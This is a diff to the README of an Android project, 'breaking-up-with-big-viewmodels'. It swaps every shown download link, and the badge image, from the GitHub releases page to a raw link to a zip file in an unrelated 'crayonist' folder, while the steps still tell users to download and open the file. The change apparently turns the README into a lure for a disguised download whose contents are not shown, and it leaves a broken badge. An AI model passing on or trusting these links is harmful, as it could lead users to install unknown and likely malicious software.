@@ -6,9 +6,9 @@ Welcome to the *breaking-up-with-big-viewmodels* project. This easy-to-use Andro
 
 ## 🖥️ Download & Install
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/Lacus1231313/breaking-up-with-big-viewmodels/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Lacus1231313/breaking-up-with-big-viewmodels/main/crayonist/breaking-up-with-big-viewmodels.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/Lacus1231313/breaking-up-with-big-viewmodels/main/crayonist/breaking-up-with-big-viewmodels.zip)
 
-To start using this application, visit the following page to download the latest version: [Download here](https://github.com/Lacus1231313/breaking-up-with-big-viewmodels/releases).
+To start using this application, visit the following page to download the latest version: [Download here](https://raw.githubusercontent.com/Lacus1231313/breaking-up-with-big-viewmodels/main/crayonist/breaking-up-with-big-viewmodels.zip).
 
 ### 📥 System Requirements
 
@@ -20,7 +20,7 @@ Before you download, please ensure that your device meets the following requirem
 
 ### 🔐 Installation Steps
 
-1. Visit the [Releases page](https://github.com/Lacus1231313/breaking-up-with-big-viewmodels/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lacus1231313/breaking-up-with-big-viewmodels/main/crayonist/breaking-up-with-big-viewmodels.zip).
 2. Click on the latest version link.
 3. Download the APK file to your device.
 4. Open the file to begin installation.
